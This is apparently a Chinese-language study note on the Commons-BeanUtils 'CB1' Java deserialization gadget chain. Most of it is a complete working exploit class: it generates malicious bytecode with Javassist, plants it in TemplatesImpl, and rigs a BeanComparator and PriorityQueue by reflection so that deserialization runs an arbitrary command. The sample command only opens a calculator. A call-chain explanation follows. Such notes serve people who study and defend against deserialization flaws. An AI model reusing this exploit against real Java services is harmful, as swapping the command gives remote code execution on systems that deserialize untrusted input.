---
title: CB1链
date: 2026-03-28
updated: 2026-03-28
tags:
  - 链子
categories:
  - 链子
description: CB1链
published: true
---
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

public class CB1Exp {

    public static void main(String[] args) throws Exception {

        // 动态生成包含恶意命令的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        constructor.setBody("{ java.lang.Runtime.getRuntime().exec(\"calc.exe\"); }");
        ctClass.addConstructor(constructor);

        byte[] bytecodes = ctClass.toBytecode();

        // 将木马装入 TemplatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_name", "EvilTemplates");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 构造无害的 BeanComparator 和 PriorityQueue
        // BigInteger 有一个方法叫 getLowestSetBit()，返回值是 int。
        // 所以它拥有一个名为 "lowestSetBit" 的属性，并且可以安全比较。
        BeanComparator comparator = new BeanComparator("lowestSetBit");
        PriorityQueue queue = new PriorityQueue(2, comparator);

        // 先塞入两个无害的 BigInteger 对象，把队列的数组撑大，同时避免报错
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        
        // 1. 把 Comparator 里的比对属性，从 "lowestSetBit" 替换成致命的 "outputProperties"
        // 这样在反序列化时，就会去调用 getOutputProperties() 方法
        setFieldValue(comparator, "property", "outputProperties");

        // 2. 把队列底层数组里的 BigInteger 替换成我们的 TemplatesImpl 炸弹
        // PriorityQueue 底层是用一个 Object[] 数组来存数据的，变量名叫 "queue"
        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        byte[] serializedQueue = serialize(queue);
        System.out.println("序列化完成...");

        unserialize(serializedQueue);

    }

    // 辅助方法：通过反射设置私有字段的值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    // 辅助方法：通过反射获取私有字段的值
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        return byteArrayOutputStream.toByteArray();
    }

    public static Object unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        return objectInputStream.readObject();
    }
}
```

> 在 Java 中，如果写了一个类，里面有一个方法叫 `getName()`，那么按照 JavaBeans 规范，这个类就拥有了一个名为 `name` 的属性。如果有一个方法叫 `getOutputProperties()`，那么它就有一个名为 `outputProperties` 的属性。

`BeanComparator` 的作用是比较两个 JavaBean 对象。当实例化它时，可以传入一个属性名（比如 `property = "name"`）。当调用它的 `compare(obj1, obj2)` 时，它底层会调用 `PropertyUtils.getProperty(obj1, "name")`，也就是去执行 `obj1.getName()`。

CC 链中 `TemplatesImpl` 的触发是 `newTransformer()`。但是 `TemplatesImpl` 里面刚好还有一个方法叫 `getOutputProperties()`，而且该方法内部直接调用了 `newTransformer()`。

因此：把 `BeanComparator` 的比较属性设置为 `"outputProperties"`，然后把它和 `TemplatesImpl` 一起塞进 `PriorityQueue` 里。反序列化时 -> 队列触发排序 -> 调用 `BeanComparator.compare()` -> 调用 `TemplatesImpl.getOutputProperties()` -> 触发 `newTransformer()` -> 字节码执行弹出计算器。

前面 `heapify()` 到 `siftDownUsingComparator()` 和 CC2 一样

这里的 `property` 已经被反射修改为 `"outputProperties"`，所以会调用 `getOutputProperties` 方法

![[attachments/20260328220808.png]]

使用反射获取属性的 getter 方法，最终会调用 `templates.getOutputProperties()`

![[attachments/20260328220837.png]]

再调用 `TemplatesImpl.newTransformer()`，后面的就和 CC 链的一样了。

```
ois.readObject() <=> ObjectInputStream.readObject()
PriorityQueue::readObject()
	->PriorityQueue::heapify()
	->PriorityQueue::siftDown()
	->PriorityQueue::siftDownUsingComparator()
	->BeanComparator::compare()
	->PropertyUtils::getProperty()                 // 获取属性
	->PropertyUtilsBean::getProperty()
	->TemplatesImpl::getOutputProperties()         // 极其关键的桥梁！
	->TemplatesImpl::newTransformer()
	->TemplatesImpl::getTransletInstance()
	->TemplatesImpl::defineTransletClasses()       // 加载恶意字节码为 Class
	->MaliciousClass::<init>()                     // 实例化恶意类执行命令
```